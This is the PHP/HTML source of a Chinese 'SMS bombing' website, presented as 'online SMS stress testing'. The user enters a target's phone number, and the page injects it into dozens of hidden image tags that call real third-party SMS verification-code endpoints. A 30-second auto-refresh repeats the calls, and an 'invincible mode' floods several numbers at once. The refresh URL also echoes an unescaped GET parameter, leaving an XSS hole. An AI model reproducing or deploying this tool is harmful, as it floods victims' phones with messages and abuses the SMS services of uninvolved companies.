...
<head>
  ...
  <title>在线短信测压 智云短信轰炸</title>
  <meta name="keywords" content="短信轰炸平台,免费短信轰炸,短信炸弹,云呼短信,云端短信,在线短信测压,短信攻击,电话轰炸">
<meta name="description" content="获取更多最新短信轰炸接口请访问地址www.zy40.cn，在线短信测压，短信轰炸平台，智卓星网开发组，智云短信">
...
<meta http-equiv="refresh" content="30.7;url=index.php?hm=<?php echo $_GET['hm'];?>">
...
<style>body{ background:#ecedf0 url("img/ChMlWl6VMdqILsoLAC1Gsx9Dmu8AAOTqAAnwSUALUbL353.jpg") fixed;background-repeat:no-repeat; background-size:100% 100%;}</style></head>
<body>
<img src="img/ChMlWl6VMdqILsoLAC1Gsx9Dmu8AAOTqAAnwSUALUbL353.jpg" alt="Full Background" class="full-bg full-bg-bottom animated pulse " ondragstart="return false;" oncontextmenu="return false;">
<br>
...
<li class="list-group-item"><span class="btn btn-info btn-xs">1</span> 本站永久完全免费提供使用，本平台会持续更新，有问题请在本平台留言!</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">2</span> 请输入对方手机号点击启动后进行轰炸
</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">3</span> 在提交手机号后，不要关闭本网页，系统会自动轰炸，轰炸过程中请勿关闭网页！</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">3</span> 轰炸平台不会记录任何信息，由系统自动提交执行轰炸</li>
<li class="list-group-item"><span class="btn btn-info btn-xs">4</span> 平台每30秒会自动执行当前已经输入的手机号进行持续云呼轰炸!</li>

<div class="btn-group btn-group-justified">
<a target="_blank" class="btn btn-info" href="http://wpa.qq.com/msgrd?v=3&uin=1455112844&site=qq&menu=yes"><i class="fa fa-qq"></i> 联系客服</a>
<a target="_blank" class="btn btn-warning" href="https://zhiyun.wodemo.net/entry/455642"><i class="fa fa-users"></i> 官方发布</a>
<a target="_blank" class="btn btn-danger" href="inde.php"><i class="fa fa-cloud-download"></i> 无敌模式</a>
</div></p></div></div></div>  
				...
				<div class="btn-group">
					<a class="btn btn-default" data-toggle="modal" href="#anounce"><i class="fa fa-bullhorn"></i>&nbsp;<span style="font-weight:bold">公告</span></a>
					 	...
					 	<a href="#lxkf" target="_blank" data-toggle="modal" class="btn btn-default"><i class="fa fa-qq"></i>&nbsp;<span style="font-weight:bold">客服</span></a>
			                <div class="btn-group">
                 <a class="btn btn-default" data-toggle="modal" href="chat/"><i class="fa fa-users fa-1x"></i>&nbsp;留言</a>
				</div>
             </div>
		</div>
	</div>
	<div class="list-group-item reed"><marquee scrollamount="5" direction="left" align="Middle" style="font-weight: bold;line-height: 20px;fo-size: 30px;color: #FF0000;">通知：本平台每30秒会持续自动执行轰炸当前已输入的手机号！其他具体详情请点击公告查看！更多精品资源请收藏官方发布地址</marquee></div>
<!--logo下面按钮-->
</div>
...
<!--在线下单-->
    <div class="tab-pane active" id="shop">
       <center><div class="shuaibi-tip animated tada  text-center"><i class="fa fa-heart text-danger"></i> <b>更多资源请收藏官方发布页，有问题请联系站长QQ号或者在本平台留言即可！<i class="fa fa-fw fa-qq text-primary"></i> h.zy40.cn&nbsp;<a href="chat/" data-toggle="modal" class="label label-danger"><font color="#FFFFFF">点击留言</font></a></div><h7><span style="color:#009900;">本站仅供个人测试手机性能使用,严禁商业非法用途!否则后果自负。</span></h7><p><span style="color:#ff0000;">本站永久免费提供使用<br>【平台全自动轰炸,使用过程中请勿关闭网页】<br>详细使用说明请点击上面的 公告 浏览查看</span></p><a href="http://h.zy40.cn" data-toggle="modal" class="badge badge-primary"><font color="#FFFFFF">【最新影片/聚合直播/超强工具/点击进入】</font></a><hr></center> </b>		<div id="goodTypeContents">
...
if($d>1){
    ...
    <img src='http://dx.zy40.cn/dx/index.php?hm=$d' alt=''/>
...
<img src='http://www.edu-edu.com/cas/web/message/send?phone=$d&isNewPhone=true' alt=''/>
<img src='http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=$d&callback=jQuery17209171715653229815_1599374652809&_=1599374671117' alt=''/>
<img src='https://host.convertlab.com/sms/get?mobile=$d&name=Convertlab&token=f04c5dc57b0242499d951bafee6ed5ef&type=form&uuid=4a48dbfe8e1d49ab87715d2ed8e6e79d' alt=''/>
<img src='http://juniorapi.gzxiangqi.cn/juniorAccounts/v2/getCode/3/$d' alt=''/>
<img src='https://login.koolearn.com/sso/sendVoiceRegisterMessage.do?callback=jQuery111205661385064312077_1594952633553&type=jsonp&mobile=$d&msgInterval=60&imageCode=&countryCode=86&country=CN&_=1594952633566' alt=''/>
<img src='https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone=$d' alt=''/>
<img src='https://passport.ganji.com/ajax.php?module=send_reg_phone_auth_code&uid=0&phone=$d&__hash__=jUl04%2Bl3swFI9ExgjM8nwT3pUZFwyleNIloHaaDq5KJfCPcclHRTVBqDX1Zv%2BgHX' alt=''/>
<img src='https://www.zx123.cn/member/register.php?action=getcode&ajax=1&mobile=$d' alt=''/>
...
<div class="tab-pane" id="search">
         ...
         <tbody>
            <tr class="shuaibi-tip animation-bigEntrance">
                <td class="text-center" style="width: 100px;">
                    <img src="http://q4.qlogo.cn/headimg_dl?dst_uin=2248186422&spec=100" alt="avatar" class="img-circle img-thumbnail img-thumbnail-avatar">
                </td>
                <td>
                    <h4><strong>站长</strong></h4>
					<i class="fa fa-fw fa-qq text-primary"></i> 2248186422<br><i class="fa fa-fw fa-history text-danger"></i>问题请联系客服
                </td>
		...
		<br>
			...
			<span class="label label-primary">事项1:</span> 本站永久免费提供，具体其他说明请点击公告查看！<p></p><p></p><span class="label label-success">事项2:</span> 输入号码点击轰炸即可开始轰炸<p></p><p></p><span class="label label-warning">事项3:</span> 关闭网页或者点击停止几分钟后即可停止轰炸<p></p><p></p><span class="label label-danger">事项4:</span> 无敌模式可以同时轰炸多个手机号或者一个		</div>
...
<table class="table table-borderless table-pricing">
            <tbody>
                ...
                <tr>
                    <td><img src="img/a9af12039d49a275069d56ba60e31f46.png" width="280" height="380"/></td>
                </tr>
...
<div class="panel-heading"><class="panel-title"><font color="#000000"><i class="fa fa-bar-chart-o"></i>&nbsp;&nbsp;<b>广告位置-<span style="color: #ff3030;">以下内容非本站运营</font></b></font></div>
...
<tr><td style="text-align: center;">
				  <a href="http://fs.ppdsw.xyz/vps.html?class=9" target="_blank" ><span class="STYLE1" style="color: #9f79ee;"><b>【廉价内容无限制的服务器】<br>vps服务器仅供几元一个月</a></b></td><!--2030年11-17日到期-->

				

<td style="text-align: center;">
				  <a href="http://yun.gduny.cn/index.php/buy/index/4/" rel="nofollow" target="_blank"
					><span class="STYLE1" style="color: #9f79ee;"><b>【高速国内外主机空间】<br>廉价高防御的主机空间
</span></a></b>
  </td><td style="text-align: center;">
				 <a href="http://www.zy40.cn" rel="nofollow" target="_blank"
					><span class="STYLE1" style="color: #9f79ee;"><b>【免费精品资源下载】<br>全网资源免费下载</span></a></b><!--2020年11/17日到期-->
				</td>
<td style="text-align: center;">
				 <a href="http://h.zy40.cn/gjdq/dh/inde.html"_blank"
...
<td style="text-align: center;">
				...
				<a href="./" rel="nofollow" target="_blank"
				  ...
				  <a href="https://wpa.qq.com/msgrd?v=3&uin=1455112844&site=qq&menu=yes" rel="nofollow" target="_blank"
					><span class="STYLE1"style="color: #FFBF00;"><b>广告位招租<br>
<span class="STYLE1"style="color: #FF0000;">全网最低价的广告费<br></span>
联系QQ号：1455112844</b></span></a><!--2020年11月25日到期-->
				</td>
</tr>
    ...
    <div class="panel panel-default">
        <center>
            <div class="panel-body"><span style="font-weight:bold">在线短信测压<i class="fa fa-heart text-danger"></i> 2020 | </span> <a href="http://zhiyunzz.simplesite.com"><span style="font-weight:bold">www.zy40.cn</span></a> <script language="javascript" type="text/javascript" src="http://js.users.51.la/18759442.js"></script><br>            </div>
    </center></div>
    <!--底部导航-->
</div>
			...
			<div class="modal-dialog">
                ...
                <li class="list-group-item">   
                   ...
                   <div class="pull-right push-15-t">
                            <a href="http://h.zy40.cn" target="_blank" class="btn btn-sm btn-info">立即联系</a>
                   </div>
                   <div class="pull-left push-10-t">
                        <div class="font-w600 push-5"><i class="fa fa-fw fa-qq text-primary"></i> 2248186422&nbsp;</div>
                        <div class="font-w600 push-5">地址~h.zy40.cn</div>
                   </div>
				   </div>
                </li>
